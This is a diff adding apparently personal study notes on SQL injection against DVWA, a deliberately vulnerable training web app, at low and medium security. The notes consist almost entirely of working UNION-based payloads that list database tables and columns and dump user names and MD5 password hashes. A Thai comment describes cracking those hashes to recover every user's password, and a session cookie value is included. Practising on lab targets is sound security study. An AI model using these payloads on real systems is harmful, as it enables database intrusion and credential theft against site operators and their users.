@@ -1,0 +1,36 @@
+/var/www/dvwa/vulnerabilities/exec
+
+
+security=low; PHPSESSID=cc8fa92dcd142a00b57714209bbdf0bf
+
+
+################## SQL Injection low security ####################
+
+"SELECT first_name, last_name FROM users WHERE user_id = '$id'"
+
+"SELECT first_name, last_name FROM users WHERE user_id = ''union select "test1", table_name from information_schema.tables #'"
+
+'union select "test1", table_name from information_schema.tables #
+
+Example from sawin Wongweerawit
+
+##################################################
+command ที่ไล่ๆ เพื่อหาตารางและได้ password ครับ
+' union select "test1", table_name from information_schema.tables #
+' union select table_name, column_name from information_schema.columns #
+' union select table_name, column_name from information_schema.columns where table_name="users" #
+' union select user, password from users #
+ได้ md5 password เอาไป decrypt ได้ password ของทุก user
+##################################################
+
+
+################## SQL Injection medium security ####################
+
+"SELECT first_name, last_name FROM users WHERE user_id = $id"
+
+"SELECT first_name, last_name FROM users WHERE user_id = 1 union select user, password from users"
+
+
+1 union select user, password from users
+
+######################################################################
